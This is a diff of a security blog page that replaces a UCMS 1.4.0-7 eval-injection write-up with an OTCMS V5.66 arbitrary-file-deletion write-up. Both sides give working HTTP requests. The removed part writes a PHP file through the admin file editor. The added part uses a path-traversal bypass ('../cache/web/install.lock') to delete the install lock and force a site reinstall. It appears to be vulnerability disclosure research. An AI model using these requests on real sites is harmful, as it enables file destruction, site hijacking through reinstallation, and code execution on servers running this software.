@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole</title>
+  <title>&#39;OTCMS  V5.66   Delete any file&#39; | LS-Loophole</title>
   <meta name="keywords" content="">
-  <meta name="description" content="&#39;UCMS v.1.4.0-7Command execution&#39; | LS-Loophole">
+  <meta name="description" content="&#39;OTCMS  V5.66   Delete any file&#39; | LS-Loophole">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Zip uses win feature to decompress, bypass blacklist and uploadVulnerability Type :File upload Vulnerability Version :YouDianCMS V9.1 Recurring environment: Windows 10 PHP 5.4.5 Apache 2.4.23  Vulnera">
 <meta property="og:type" content="article">
@@ -277,9 +277,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-UCMS v.1.4.0-7Command execution" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-OTCMS  V5.66   Delete any file" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">&#39;UCMS v.1.4.0-7Command execution&#39;</h1>
+        <h1 class="article-title">&#39;OTCMS  V5.66   Delete any file&#39;</h1>
     
     <div class="article-meta">
         
@@ -289,7 +289,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2020-09-22 20:55:13'>2020-09-22 20:52</time>
+            发布时间 : <time class="date" title='最后更新: 2021-01-10 00:22:37'>2021-01-10 00:17</time>
         
     </div>
     <div class="article-meta">
@@ -311,7 +311,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UCMS-v-1-4-0-7Command-execution"><span class="toc-text">UCMS v.1.4.0-7Command execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OTCMS-V5-66-Delete-any-file"><span class="toc-text">OTCMS  V5.66   Delete any file</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Type"><span class="toc-text">Vulnerability Type :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Version"><span class="toc-text">Vulnerability Version :</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recurring-environment"><span class="toc-text">Recurring environment:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Description-AND-recurrence"><span class="toc-text">Vulnerability Description AND recurrence:</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -327,43 +327,90 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="UCMS-v-1-4-0-7Command-execution"><a href="#UCMS-v-1-4-0-7Command-execution" class="headerlink" title="UCMS v.1.4.0-7Command execution"></a>UCMS v.1.4.0-7Command execution</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>Eval injection</p>
-<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>1.4.0-7</p>
+        <h1 id="OTCMS-V5-66-Delete-any-file"><a href="#OTCMS-V5-66-Delete-any-file" class="headerlink" title="OTCMS  V5.66   Delete any file"></a>OTCMS  V5.66   Delete any file</h1><h2 id="Vulnerability-Type"><a href="#Vulnerability-Type" class="headerlink" title="Vulnerability Type :"></a>Vulnerability Type :</h2><p>Insecure Permissions</p>
+<h2 id="Vulnerability-Version"><a href="#Vulnerability-Version" class="headerlink" title="Vulnerability Version :"></a>Vulnerability Version :</h2><p>V5.66</p>
 <h2 id="Recurring-environment"><a href="#Recurring-environment" class="headerlink" title="Recurring environment:"></a>Recurring environment:</h2><ul>
 <li>Windows 10</li>
 <li>PHP 5.4.5</li>
 <li>Apache 2.4.23</li>
 </ul>
-<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p>1、The current version is V1.4.5<br><img src="/imgss/40.png"></p>
-<p>2、Using the keyword search, I found the fopen() function in the<br>\UCMS\sadmin\fileedit.php file, where there are no restrictions on the filename suffix and content to write! So the PHP suffix can be written here to cause malicious command execution!</p>
-<p><img src="/imgss/41.png"></p>
-<p>3、Here I backtrace, first $_POST[&amp;apos;co&amp;apos;] exists, then $_GET[&amp;apos;file&amp;apos;]) exists, and $_GET[&amp;apos;dir&amp;apos;] exists. Most of all! In the first line of the file, we determine if there is a global variable admin. In this case, we can&amp;apos;t do anything without authorization, we just have to look up where is the entry</p>
-<p><img src="/imgss/42.png"></p>
-<p>4、The current file is under/UCMS/UCMS. This is the background file. And all the data can be found through the background operation route/UCMS /index.php hole. Go to /UCMS/index.php here</p>
-<p><img src="/imgss/43.png"></p>
-<p>5、And you can actually see that right here, it&amp;apos;s included by requiring something here. For analysis here, GET type parameters do and NOHTML need to be passed. And split $_GET[&amp;apos;do&amp;apos;] with &amp;apos;_&amp;apos; as the divider. The first part is included as the name of the folder, and the second part is included as the file name +&amp;apos;.php&amp;apos;.</p>
-<p>6、So the idea here is pretty clear, the vulnerability file is fileedit.php and it&amp;apos;s under sadmin, so $_GET[&amp;apos;do&amp;apos;] is sadmin_fileEdit. This satisfies the criteria to enter the fileEdit file, at which point you only need to satisfy the criteria in Fileedit.php. Here the POST package is<br>as follows:</p>
-<pre><code>POST /ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=CNVD.php&amp;amp;pos=15 HTTP/1.1
-Host: www.ucm1.5.0.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 
-Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+<h2 id="Vulnerability-Description-AND-recurrence"><a href="#Vulnerability-Description-AND-recurrence" class="headerlink" title="Vulnerability Description AND recurrence:"></a>Vulnerability Description AND recurrence:</h2><p><strong>Vulnerability introduction</strong><br>Through this vulnerability, you can delete any file on the server, including deleting the installation file, resulting in the whole website being reinstalled!</p>
+<p><strong>Vulnerability location</strong><br>CMS/admin/template_ deal.php Delfile() function in file</p>
+<pre><code>if (strpos(substr($filePath,3),&#39;..&#39;) !== false)&#123;
+        JS::AlertBackEnd(&#39;禁止查询路径中出现“..”字符串&#39;);
+&#125;</code></pre>
+<p><strong>Vulnerability analysis</strong></p>
+<p>The main reason for this vulnerability is that the code filtering is not strict, and the vulnerability code is as follows</p>
+<pre><code>if (strpos(substr($filePath,3),&#39;..&#39;) !== false)&#123;
+        JS::AlertBackEnd(&#39;禁止查询路径中出现“..”字符串&#39;);
+&#125;</code></pre>
+<p><img src="/imgss/70.png"><br>You can see that the substr() function is used here, starting from the third bit to the last bit</p>
+<pre><code>substr($filePath,3)</code></pre>
+<p>Definition and Usage </p>
+<pre><code>The substr() function returns part of the string.
+
+Note: if the start parameter is negative and length is less than or equal to start, then length is 0.</code></pre>
+<p>Then put the extracted string into the strpos () method to match the character “..”</p>
+<pre><code>(strpos(substr($filePath,3),&#39;..&#39;</code></pre>
+<p>As you can see, if there is “..” here, then loops is true. This causes if to set up, then output and end.</p>
+<pre><code>&#39;prohibit&#39;.. &#39;string in query path&#39;</code></pre>
+<p>In the process of penetration, most of the files we use for directory traversal are files followed by “..”, as follows</p>
+<pre><code>config.php/../../admin.php</code></pre>
+<p>However, if the above method is used, it will be filtered by the code logic and cannot be executed</p>
+<pre><code>if (strpos(substr($filePath,3),&#39;..&#39;) !== false)&#123;
+        JS::AlertBackEnd(&#39;禁止查询路径中出现“..”字符串&#39;);
+&#125;</code></pre>
+<p><img src="/imgss/71.png"></p>
+<pre><code>GET /admin/template_deal.php?mudi=delFile&amp;sel=pc&amp;num=25&amp;filePath=config.php/../../admin.php HTTP/1.1
+Host: www.otcms.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
-Referer: 
-http://www.ucm1.5.0.com/ucms/?do=sadmin_fileedit&amp;amp;dir=/&amp;amp;file=123.php&amp;amp;pos=15
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 58
 Connection: close
-Cookie: admin_a83bb0=admin; psw_a83bb0=6609024d5fb57f730314b384acb138e4; 
-token_a83bb0=a81beeab
+Referer: http://www.otcms.com/admin/template.php?mudi=manage&amp;sel=pc&amp;dataType=&amp;dataTypeCN=%E6%A8%A1%E6%9D%BF&amp;dirStr=default/skin/
+Cookie: AwLRv_memberInfo=WzcEC1VhBjAIZA5oAW8CXQIzUzcENFVvAGNTNFYyVTMMZQdnAGMDZggxXTdWY1AxUmpSbAA0CTMFMwRkADJWZVs0BDRVOQYwCG0OYgE1AjICClNlBDZVYQArU2ZWfVVgDH8HMABcA2MIOV1gVmZQK1JiUmQALQk5BTAEIQA0VmNbPAQxVTUGbgg4DjgBCAK8ArVT0QTjVewAolOxVv1V8Qy2B5EA0wO0CJhdyg%3D%3D; AwLRv_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; VtYHC_memberInfo=BDYCCQdiVGVRPFFtDW8GW1U1AWMPZVpgAjVTY1ZkBm9XZQM2U2UFZAZnUTAKMQFjB2NQY1RsCzUCMQU1CToFZgQ%2FAjAHOlQ3UWhRNQ1gBjFVDAFgDzNaZgIvU2VWfQZmV3oDMFNeBWIGNlE2CjYBeAdmUDFUdwszAjEFIwk9BWYEPQIxBztUO1FgUTwNCAa6VbMB1A%2FmWusCplOyVv0G91ezA5FT0QW1BpdRnA%3D%3D; VtYHC_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; FAhbo_memberInfo=WGBXDQA0AWsGbwRrAGNXDlBmBWUJOlVlBTRRZABhVmgIMVk%2FWW0OZQtsBzUKMgBlUDMMalMxUWdWMApuB2cHY1gwVzMAbAE5BmcEZwBpVzVQWAVlCWxVMAV4UTEAeVY7CC9ZO1kFDjILPwczCjcAfVBgDGxTKVEwVjUKegdhB2lYa1cxAG0BNQYwBDMABFfvUOcF0Qm5Vb0F8VHmAPlWqgjmWZpZig7lC54HmQ%3D%3D; FAhbo_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; PHPSESSID=vlie1lpfg28tu7vp8spvcufq73
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p>You can only use “..” in the first three characters if you want to bypass</p>
+<pre><code>../admin.php</code></pre>
+<p>In this way, you can bypass the filtering of strpos, but you can see that you can only skip one layer of directory on the Internet. At this time, the relative path of the current web page is very important. We know that the vulnerability file path is</p>
+<pre><code>admin/template_deal.php</code></pre>
+<p><img src="/imgss/72.png"></p>
+<p>It’s under the directory admin, so it’s easy to do. You can directly jump up one layer to return to the root directory, so that the scope of deletion becomes the whole CMS!</p>
+<p><strong>Vulnerability trigger process</strong></p>
+<p>Until there are loopholes here, it is to find out how to trigger! The current file is known as template_ deal.php , the vulnerability is in the delfile() function!</p>
+<p>First of all, through reading the code, it is determined that most of the functions in this file are functions, and the switch selected function exists in the header.</p>
+<p>Therefore, this file can directly access the transfer data, or be referenced to transfer data!<br><img src="/imgss/73.png"></p>
+<p>First, find the file name to determine whether the front-end code references this file!</p>
+<pre><code>template_deal.php</code></pre>
+<p>You can see that template.php Template exists in the front-end form code_ del.php And the variable Mudi in switch is passed<br><img src="/imgss/74.png"></p>
+<p>You can visit it directly here template.php Find out where this field is<br><img src="/imgss/75.png"></p>
+<p>Click Open template management is our vulnerability trigger page!<br><img src="/imgss/76.png"></p>
+<p>You can see that the red delete button at the back is roughly the deletion point. Here, grab a packet and delete one of them. Take a look at the packet at random. As you can see, this is the trigger point of the vulnerability!<br><img src="/imgss/77.png"></p>
+<pre><code>GET /admin/template_deal.php?mudi=delFile&amp;sel=pc&amp;num=17&amp;filePath=default/usersCenter.html</code></pre>
+<p>Here in order to demonstrate the effect, delete the installation file to reload!</p>
+<pre><code>http://www.otcms.com/install/</code></pre>
+<p><img src="/imgss/78.png"></p>
+<p>Delete cache / Web here/ install.lock File, build vulnerability POC.</p>
+<pre><code>../cache/web/install.lock</code></pre>
+<p>Successfully deleted<br><img src="/imgss/79.png"></p>
+<pre><code>GET /admin/template_deal.php?mudi=delFile&amp;sel=pc&amp;num=25&amp;filePath=../cache/web/install.lock HTTP/1.1
+Host: www.otcms.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://www.otcms.com/admin/template.php?mudi=manage&amp;sel=pc&amp;dataType=&amp;dataTypeCN=%E6%A8%A1%E6%9D%BF&amp;dirStr=default/skin/
+Cookie: AwLRv_memberInfo=WzcEC1VhBjAIZA5oAW8CXQIzUzcENFVvAGNTNFYyVTMMZQdnAGMDZggxXTdWY1AxUmpSbAA0CTMFMwRkADJWZVs0BDRVOQYwCG0OYgE1AjICClNlBDZVYQArU2ZWfVVgDH8HMABcA2MIOV1gVmZQK1JiUmQALQk5BTAEIQA0VmNbPAQxVTUGbgg4DjgBCAK8ArVT0QTjVewAolOxVv1V8Qy2B5EA0wO0CJhdyg%3D%3D; AwLRv_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; VtYHC_memberInfo=BDYCCQdiVGVRPFFtDW8GW1U1AWMPZVpgAjVTY1ZkBm9XZQM2U2UFZAZnUTAKMQFjB2NQY1RsCzUCMQU1CToFZgQ%2FAjAHOlQ3UWhRNQ1gBjFVDAFgDzNaZgIvU2VWfQZmV3oDMFNeBWIGNlE2CjYBeAdmUDFUdwszAjEFIwk9BWYEPQIxBztUO1FgUTwNCAa6VbMB1A%2FmWusCplOyVv0G91ezA5FT0QW1BpdRnA%3D%3D; VtYHC_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; FAhbo_memberInfo=WGBXDQA0AWsGbwRrAGNXDlBmBWUJOlVlBTRRZABhVmgIMVk%2FWW0OZQtsBzUKMgBlUDMMalMxUWdWMApuB2cHY1gwVzMAbAE5BmcEZwBpVzVQWAVlCWxVMAV4UTEAeVY7CC9ZO1kFDjILPwczCjcAfVBgDGxTKVEwVjUKegdhB2lYa1cxAG0BNQYwBDMABFfvUOcF0Qm5Vb0F8VHmAPlWqgjmWZpZig7lC54HmQ%3D%3D; FAhbo_memberRealName=%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98; PHPSESSID=vlie1lpfg28tu7vp8spvcufq73
 Upgrade-Insecure-Requests: 1
 
-uuu_token=a81beeab&amp;amp;co=&amp;lt;?php phpinfo()?&amp;gt;&amp;amp;pos=17
 </code></pre>
-<p><img src="/imgss/44.png"></p>
-<p>7、Here our Webshell phpInfo is in CNVD.php in the root directory</p>
-<p><img src="/imgss/45.png"></p>
+<p>Visit the installation page again</p>
+<pre><code>http://www.otcms.com/install/</code></pre>
+<p>You can see that it has been deleted successfully. You can re install this website!</p>
+<p><img src="/imgss/80.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至lingyu195@gmail.com </span>
